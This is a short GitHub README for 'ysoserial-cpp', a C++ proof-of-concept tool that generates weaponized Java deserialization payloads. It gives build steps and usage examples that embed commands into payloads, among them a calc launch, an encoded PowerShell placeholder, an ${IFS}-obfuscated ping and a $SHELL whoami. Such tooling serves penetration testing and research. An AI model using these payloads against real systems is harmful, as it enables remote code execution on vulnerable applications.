  ```
       ▄█    ▄████████ ███▄▄▄▄   ███▄▄▄▄   ▄██   ▄    ▄█          ▄████████ ▀█████████▄  
      ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄ ███   ██▄ ███         ███    ███   ███    ███ 
      ███   ███    █▀  ███   ███ ███   ███ ███▄▄▄███ ███         ███    ███   ███    ███ 
      ███  ▄███▄▄▄     ███   ███ ███   ███ ▀▀▀▀▀▀███ ███         ███    ███  ▄███▄▄▄██▀  
      ███ ▀▀███▀▀▀     ███   ███ ███   ███ ▄██   ███ ███       ▀███████████ ▀▀███▀▀▀██▄  
      ███   ███    █▄  ███   ███ ███   ███ ███   ███ ███         ███    ███   ███    ██▄ 
      ███   ███    ███ ███   ███ ███   ███ ███   ███ ███▌    ▄   ███    ███   ███    ███ 
  █▄ ▄███   ██████████  ▀█   █▀   ▀█   █▀   ▀█████▀  █████▄▄██   ███    █▀  ▄█████████▀  
  ▀▀▀▀▀▀                                             ▀                                   
```



# ysoserial-cpp


![image](https://github.com/user-attachments/assets/da6827fc-b24f-4b6d-8faa-fc99d5a233e5)




## ysoserial-cpp ( PoC )
Implementation of object serializations an weaponizing in cpp similar functionalitity ( a lost day... than yoserial )

GNU GPL3 License ( JennyLab OpenSource )
    

### Build

```
g++ -std=c++17 -O2 -o ysoserial-cpp ysoserial.cpp
```
or

```
mkdir build
cd build
cmake ..
make
```

or

```
make
```


### Payload inject execution commands abusing serialization

```
./ysoserial-cpp templates "cmd /c calc"
```

### Encoding

```
./ysoserial-cpp object1 "powershell -enc <base64_command>"
```
        
### Obfucation 

```
./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
```
        
### Inyecting ENV

```
./ysoserial-cpp templates "\$SHELL -c 'whoami'"
```




## Code "ysoserial-cpp.cpp"
```
  ysoserial.cpp   # ysoserial-cpp
  ├── JavaSerialization   # Constants and types
  ├── JavaPayloadGen # Main class to make and object in C++ to serialize this serialization with provide and destination in seralize... Seria... Lize!!!
```                                                           




